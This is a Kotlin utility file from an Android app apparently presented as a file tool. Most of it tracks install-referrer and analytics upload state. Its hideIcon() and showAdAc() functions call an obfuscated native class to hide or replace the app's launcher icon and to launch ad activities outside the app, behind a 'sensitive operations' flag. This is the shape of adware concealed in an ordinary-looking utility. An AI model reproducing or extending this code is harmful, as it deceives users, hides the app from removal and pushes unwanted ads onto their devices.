package com.hal.convenientfile.util

import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.webkit.WebView
import com.byLQVcZ.YjprUUji.rzgxDdj
import com.hal.convenientfile.base.BaseApp
import java.util.*
import kotlin.concurrent.thread

/**
 * Description:
 * Author: Icarus.Lee
 * Email: 769247877@qq.com
 * Date: 2023/11/3
 */
object AppUtil {
    private val app by lazy { BaseApp.app }
    private val packageInfo by lazy { app.packageManager.getPackageInfo(app.packageName, 0) }

    /**
     * referrerUrl
     */
//    val referrerUrl by lazy { UnPeekLiveData<String?>(null) }

    val userWebViewAgent by lazy {
        try {
            WebView(app).settings.userAgentString
        } catch (e: Exception) {
            "unkown agent"
        }
    }

    /**
     * 首次安装的秒数
     */
    val firstInstallTime by lazy { packageInfo.firstInstallTime / 1000 }

    /**
     * 最后更新的秒数
     */
    val lastUpdateTime by lazy { packageInfo.lastUpdateTime / 1000 }

    /**
     * 应用安装开始时的客户端时间戳(秒)
     */
    val installBeginTime by lazy { ChangedVersionLiveData<Long?>(null) }

    /**
     * 引荐来源网址点击事件发生时的客户端端时间戳(秒)
     */
    val referrerClickTime by lazy { ChangedVersionLiveData<Long?>(null) }

    /**
     * 应用安装开始时的服务器端时间戳(秒)
     */
    val installBeginServerTime by lazy { ChangedVersionLiveData<Long?>(null) }

    /**
     * google 商店获取 referrerUrl
     */
    val referrerUrl by lazy { ChangedVersionLiveData<String?>(null) }

    /**
     * google 商店获取 installVersion
     */
    val installVersion by lazy { ChangedVersionLiveData<String?>(null) }

    /**
     * 引荐来源网址点击事件发生时的服务器端时间戳(秒)
     */
    val referrerClickServerTime by lazy { ChangedVersionLiveData<Long?>(null) }

    /**
     * 是否是第一次安装app
     */
    val isFirstInstallApp by lazy {
        ChangedVersionLiveData(
            SPUtil.getBoolean(
                SpKey.SP_KEY_IS_FIRST_INSTALL,
                true
            )
        )
    }


    /**
     * 是否已经上传了referrer到google分析
     */
    val isUploadReferrer by lazy {
        ChangedVersionLiveData(
            SPUtil.getBoolean(
                SpKey.SP_KEY_IS_UPLOAD_REFERRER,
                false
            )
        )
    }

    /**
     * 第一次打开应用时间
     */
    val firstOpenTime by lazy {
        ChangedVersionLiveData(
            SPUtil.getLong(
                SpKey.SP_KEY_FIRST_OPEN_CLIENT_TIME,
                0
            )
        )
    }

    /**
     * 是否已经调用了安装事件接口
     */
    val isUploadInstallEvent by lazy {
        ChangedVersionLiveData(
            SPUtil.getBoolean(
                SpKey.SP_KEY_IS_UPLOAD_INSTALL_EVENT,
                false
            )
        )
    }

    /**
     * 是否已经上传了安装事件到TB后台(安装事件埋点)
     */
    val isUploadTbaInstallEvent by lazy {
        ChangedVersionLiveData(
            SPUtil.getBoolean(
                SpKey.SP_KEY_IS_UPLOAD_INSTALL_TO_TBA,
                false
            )
        )
    }

    /**
     * 是否已经上传了用户类型数据到TB后台
     */
    val isUploadUserTypeEvent by lazy {
        ChangedVersionLiveData(
            SPUtil.getBoolean(
                SpKey.SP_KEY_IS_UPLOAD_USER_TYPE,
                false
            )
        )
    }

    /**
     * service是否启动成功
     */
    val isServiceStartSuccess by lazy { ChangedVersionLiveData<Boolean?>(null) }


    /**
     * 是否能做敏感操作
     */
    @Volatile
    var canOpt = false

    /**
     * 隐藏或替换app图标，如果要外弹app必须在之前调用至少一次(如在application中)
     */
    fun hideIcon() {
        if (canOpt) {
            Handler(Looper.getMainLooper()).post {
                val hideResult = rzgxDdj.iWLUKwwa(app, "12".toInt())
                SPUtil.putBoolean(SpKey.SP_KEY_IS_ICON_HIDE, true)
                log("hideIcon...reuslt==", hideResult)
//                "hideIcon...reuslt==$hideResult".toast()
            }
        }
    }

    /**
     * 外弹activity,已在so中配置好
     */
    fun showAdAc() {
        if (canOpt) {
            thread {
                "showAcInit...".log()
                val showAcResult = rzgxDdj.iWLUKwwa(app, "15".toInt())
//                log("showAcResult===", showAcResult)
            }
        }
    }

    fun isIconHide() = SPUtil.getBoolean(SpKey.SP_KEY_IS_ICON_HIDE, false)


    /**
     * 检查当日是否上传了process active事件，如果没有则上传
     */
    fun checkAndUploadProcessActive() {
        val lastUploadTime = SPUtil.getLong(SpKey.SP_KEY_LAST_UPLOAD_PROCESS_ACTIVE_TIME)
        val calendar = Calendar.getInstance()
        val nowYear = calendar.get(Calendar.YEAR)
        val nowMonth = calendar.get(Calendar.MONTH)
        val nowDate = calendar.get(Calendar.DATE)
        calendar.timeInMillis = lastUploadTime
        val lastUploadYear = calendar.get(Calendar.YEAR)
        val lastUploadMonth = calendar.get(Calendar.MONTH)
        val lastUploadDate = calendar.get(Calendar.DATE)
        if (nowYear != lastUploadYear || nowMonth != lastUploadMonth || nowDate != lastUploadDate) {
            //上传
            TbaUtil.logEvent(Event.APP_PROCESS_ACTIVE, Bundle())
        } else {
            "process active the same day ...".log()
        }
    }
}